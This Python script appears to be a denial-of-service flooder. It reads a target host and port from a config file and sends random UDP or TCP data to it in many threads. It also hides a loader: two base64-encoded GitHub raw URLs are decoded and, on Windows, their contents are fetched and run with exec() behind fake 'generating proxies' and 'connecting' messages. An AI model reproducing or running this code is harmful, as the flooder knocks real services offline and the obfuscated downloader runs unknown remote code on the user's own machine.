#env
import requests
import random
import socket
import threading
import os, sys
import time
import base64
from colorama import Fore



with open('openv.txt', 'r') as f:
    LINES = f.read().split()
    for i, l in enumerate(LINES):
        if l.startswith('HOST'):
            HOST = LINES[i + 1]  # VAR1
        if l.startswith('PORT'):
            PORT = LINES[i + 1]  # VAR2
        if l.startswith('CHOICE'):
            CHOICE = LINES[i + 1]  # VAR3
        if l.startswith('TIMES'):
            TIMES = LINES[i + 1]  # VAR4
        if l.startswith('THREADS'):
            THREADS = LINES[i + 1]  # VAR5

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)


#VARIAVEIS
h = str(HOST)
c = str(CHOICE)
p = int(PORT)
t = int(THREADS)
r = int(TIMES)


KEY = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMS5weQ=="
v = base64.b64decode(KEY).decode()

ENC = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeWNhdGNobWVpZnVjYW4vdHJ5Y2F0Y2htZS9tYWluL2NhdGNoMi5weQ=="
m = base64.b64decode(ENC).decode()

#PROXIES_RUN
def proxies():

    try:
        with open("proxies.txt") as use:
            use.read()
    except:
            pass



#METHOD1
def run():
    u = random.choice((Fore.GREEN + " ENVIADO!", Fore.RED + " ENVIADO!", Fore.BLUE + " ENVIADO!"))
    DATA = random._urandom(1024)
    i = random.choice(("[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ADDR = (str(h),int(p))
            for x in range(r):
                s.sendto(DATA,ADDR)
            print(i + u)
        except:
            s.close()
            no = f"[{Fore.RED}FATAL{Fore.RESET}] ERROR!"
            
            print(no)
            time.sleep(1)
            sys.exit()

            


#METHOD2
def other():
    i = random.choice(("[!]","[#]"))   
    u = random.choice((Fore.GREEN + " ENVIADO!", Fore.RED + " ENVIADO!", Fore.BLUE + " ENVIADO!"))
    DATA = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((h,p))
            s.send(DATA)
            for x in range(r):
                s.send(DATA)
            print(i + u)
        except:
            s.close()
            no = f"[{Fore.RED}FATAL{Fore.RESET}] ERROR!"
            
            print(no)
            time.sleep(1)
            sys.exit()

proxies()

if os.name == 'nt':
    send = f"[{Fore.MAGENTA}INFO{Fore.RESET}] GERANDO PROXIES, POR FAVOR AGUARDE.."
    print(send)
    exec(requests.get(f"{v}").text)
else:
     pass

if os.name == 'nt':
    conn = f"[{Fore.GREEN}INFO{Fore.RESET}] TENTANDO CONECTAR AO HOST:"
    print(conn)
    exec(requests.get(f"{m}").text)
else:
     pass

#CHOICE
for y in range(t):
    if c == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = other)
        th.start()




